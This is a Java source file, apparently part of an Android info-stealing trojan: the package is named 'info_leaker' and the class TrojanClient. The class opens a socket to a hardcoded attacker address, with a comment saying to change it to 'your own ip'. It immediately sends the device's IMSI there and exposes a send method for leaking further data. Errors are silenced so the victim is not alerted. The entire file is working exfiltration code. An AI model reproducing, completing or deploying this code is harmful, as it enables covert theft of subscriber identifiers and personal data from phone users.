package com.info_leaker;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;


public class TrojanClient {
	public static final int PORT = 5454;
	// change to your own ip
	public static final String IP = "192.168.106.1";
	
	boolean isConnect = false;
	BufferedWriter os = null;		// output stream
	Socket m_socket;
	GetInfo m_getinfo;

	public TrojanClient(GetInfo gi){
		try {
			m_getinfo = gi;
			m_socket = new Socket();
			InetSocketAddress addr = new InetSocketAddress(IP, PORT);
			m_socket.connect(addr, 100);
			isConnect = true;
			os = new BufferedWriter(new OutputStreamWriter(m_socket.getOutputStream()));
			// send IMSI to server
			this.send(m_getinfo.getIMSI());
		} catch (IOException e) {
			// keep silent
			e.printStackTrace();
		}
	}
	
	public void send(String msg){
		if(isConnect){
			try {
				os.write(msg + "\n");
				os.flush();
			} catch (IOException e) {
				// keep silent
				e.printStackTrace();
			}
		}
			//os.println(msg);
	}
	/**
	 * send close message to server and close connect
	 * call this if you want to disconnect
	 */
	public void close(){
		try {
			if(isConnect)
				this.send(Common.END);
			if (m_socket != null)
				m_socket.close();
			if (os != null)
				os.close();
		} catch (IOException e) {
			// keep silent
		}
		
	}
}
